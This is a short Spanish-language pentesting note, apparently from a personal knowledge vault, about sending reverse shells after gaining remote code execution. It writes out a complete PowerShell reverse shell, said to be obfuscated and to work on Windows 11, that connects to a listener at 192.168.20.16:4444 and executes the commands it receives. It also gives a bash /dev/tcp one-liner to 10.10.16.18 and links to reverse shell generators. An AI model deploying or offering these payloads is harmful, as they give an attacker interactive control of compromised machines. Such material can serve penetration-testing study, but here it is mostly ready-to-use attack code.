
-------------

#vulnerabilidad #shell #explotacion

---------
Este tipo de Shell suele devolverse durante la ejecución remota de comandos en la máquina víctima.

Payload ofuscado a través de **POWERSHELL**  que funciona actualmente en windows 11

```powershell
 $S = "192.168.20.16"; $P = 4444; $T = [Net.Sockets.TCPClient]; $C = New-Object $T($S, $P); $N = $C.GetStream(); $R = [IO.StreamReader]; $W = [IO.StreamWriter]; $B = New-Object "System.Byte[]" 1024; $O = New-Object $R($N); $A = New-Object $W($N); $A.AutoFlush = $true; while($C.Connected){while($N.DataAvailable){$D = $N.Read($B, 0, $B.Length); $F = ([Text.Encoding]::UTF8).GetString($B, 0, $D - 1); if($C.Connected -and $F.Length -gt 1){$X=try{Invoke-Expression($F) 2>&1}catch{$_.Exception.Message};$A.Write("$X`n");}}}$C.Close();$N.Close();$O.Close();$A.Close();
```

![[Pasted image 20241014021812.png]]


---

### Mejores Comandos a la hora del envió de una Reverse Shell


Inicialmente cuando tenemos acceso a una ejecución remota de comandos [[Log Poisoning (LFI a un RCE)]]  necesitamos enviarnos una reverse shell para poder operar bajo consola, para esto el mejor comando de reverse shell es el siguiente, teniendo en cuenta que si lo tenemos que poner en una URL necesitamos hacerle un [[URL Encode]]:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.18/4444 0>&1'
```

- Obviamente teniendo en cuenta que debemos estar en escucha en el otro lado con listeners como por ejemplo [[NetCat]]

Una vez ya tengamos una Shell interactiva, podremos realizar el [[5. Tratamiento de la tty]] 


---

### Recursos Online para entablar Reverse Shell

- [Pentest Monkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) -> Aqui estan los formatos generales de reverse shell
- [Revers Shell](https://www.revshells.com/) -> Generador online Automático de Reverse Shell 

